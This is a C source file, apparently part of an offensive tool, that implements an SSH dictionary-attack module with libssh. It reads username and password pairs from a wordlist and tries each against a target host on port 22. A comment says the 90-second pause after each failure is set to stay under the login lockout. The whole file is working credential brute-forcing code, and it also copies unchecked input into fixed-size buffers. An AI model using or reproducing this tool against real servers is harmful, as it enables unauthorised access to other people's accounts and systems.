
//brute forcing module using dictionary attack
//lockout delay based on /etc/pam.d/login for when ssh doesnt want to play ball
#define MAXLINE 1000

int brute_auth(char* filanme, char* host);
int try_auth_ssh(char* user, char* pass, char* host);
int make_ssh_connection(ssh_session ssh);

int brute_auth(char* filename, char* host) { 
    FILE* fileptr = fopen(filename, "r");
    char line[MAXLINE];
    assert(fileptr != NULL);
   char passwd[25];
    char user[35];
    while (fgets(line, sizeof(line), fileptr) != NULL) { 
         bzero(user, sizeof(user)); 
        char* space = strchr(line, ' '); 
        space = space + 1;  
       
        strcpy(passwd, space);
        strncpy(user, line, strlen(line) - strlen(space));

       if(try_auth_ssh(user, passwd, host)) { 
           printf("password found!...\n");
           return 1;
       }
    
    }

    return 0;
}

int try_auth_ssh(char* user, char* pass, char* host) { 
    ssh_session ssh = ssh_new();
    int port = 22;

    if (ssh == NULL) { 
        printf("error, could not create session...\n");
        exit(-1);
    }

    ssh_options_set(ssh, SSH_OPTIONS_HOST, host);
    ssh_options_set(ssh, SSH_OPTIONS_PORT, &port);
    //ssh_options_set(ssh, SSH_OPTIONS_TIMEOUT, 10);
    ssh_options_set(ssh, SSH_OPTIONS_USER, user);
    ssh_options_set(ssh, SSH_OPTIONS_COMPRESSION_C_S, "none");
    ssh_options_set(ssh, SSH_OPTIONS_COMPRESSION_S_C, "none");

    make_ssh_connection(ssh);


    int conn = ssh_userauth_password(ssh, user, pass);

    if (conn != SSH_AUTH_SUCCESS) {
        fprintf(stderr, "Error: %s \n", ssh_get_error(ssh));
        fprintf(stderr, "for password: %s\n", pass);
        ssh_disconnect(ssh);
        ssh_free(ssh);
        sleep(90);
        return 0;
    }
    else { 
        printf("password found!...\n");
        return 1;
    }





}

int make_ssh_connection(ssh_session ssh) {
//make ssh connection...
    int rc = ssh_connect(ssh);
    if (rc != SSH_OK) { 
        fprintf(stderr, "Error connecting to: %s\n", ssh_get_error(ssh));
        ssh_disconnect(ssh);
        ssh_free(ssh);
        exit(-1);
    }

    return rc;

}